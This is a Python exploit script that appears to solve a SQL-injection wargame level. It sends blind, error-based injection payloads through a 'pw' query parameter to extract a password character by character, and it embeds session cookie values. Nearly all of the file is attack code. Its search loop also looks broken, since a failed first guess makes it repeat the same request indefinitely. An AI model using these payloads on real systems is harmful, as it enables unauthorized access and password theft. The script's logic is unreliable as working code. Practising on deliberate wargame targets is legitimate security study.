import requests
from bs4 import BeautifulSoup
import re

bfs = BeautifulSoup
URL = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?"
cookie = {
    "cfduid":"d2723ec13c81ed27c6c118370d0a599531526304045",
    "PHPSESSID":"0mt3ik9fpq2ni51cjc01419r51"
}
session1 = requests.Session()
pw = ""



for i in range(16):
    low = 32
    high = 126
    while True :
        mid = int((low+high)/2)
        # data = "pw=1' or if(length(pw)=16,(1=1),(select 1 union select null));%00"
        data = "pw=1' or if(ord(left(pw,"+str(i+1)+"))='"+str(low)+"',(1=1),(select 1 union select null));%00"
        req1= session1.get(URL+data,cookies=cookie)
        bu1 = bfs(req1.text,'html5lib')
        try:
            a=bu1.body.strong.name
            pw = pw+chr(low)
            print (pw)
            break
        except:
            continue
        data = "pw=1' or if(ord(left(pw,"+str(i+1)+"))='"+str(high)+"',(1=1),(select 1 union select null));%00"
        req1= session1.get(URL+data,cookies=cookie)
        bu1 = bfs(req1.text,'html5lib')
        try:
            a=bu1.body.strong.name
            pw = pw+chr(high)
            print (pw)
            break
        except:
            continue
        data = "pw=1' or if(ord(left(pw,"+str(i+1)+"))='"+str(mid)+"',(1=1),(select 1 union select null));%00"
        req1= session1.get(URL+data,cookies=cookie)
        bu1 = bfs(req1.text,'html5lib')
        try:
            a=bu1.body.strong.name
            pw = pw+chr(mid)
            print (pw)
            break
        except:
            continue
        data = "pw=1' or if(ord(left(pw," + str(i + 1) + "))<'" + str(
            mid) + "',(1=1),(select 1 union select null));%00"
        req1= session1.get(URL+data,cookies=cookie)
        bu1 = bfs(req1.text,'html5lib')
        try:
            a=bu1.body.strong.name
            high = mid - 1
        except: continue

        data = "pw=1' or if(ord(left(pw," + str(i + 1) + "))>'" + str(
            mid) + "',(1=1),(select 1 union select null));%00"
        req1= session1.get(URL+data,cookies=cookie)
        bu1 = bfs(req1.text,'html5lib')
        try:
            a=bu1.body.strong.name
            low = mid + 1
        except: continue

        if low >= high :
            print ("can't find anymore ....")
            print ("password is : "+pw+" or "+pw.lower())
            exit (0)
print ("password is : "+pw+" or "+pw.lower())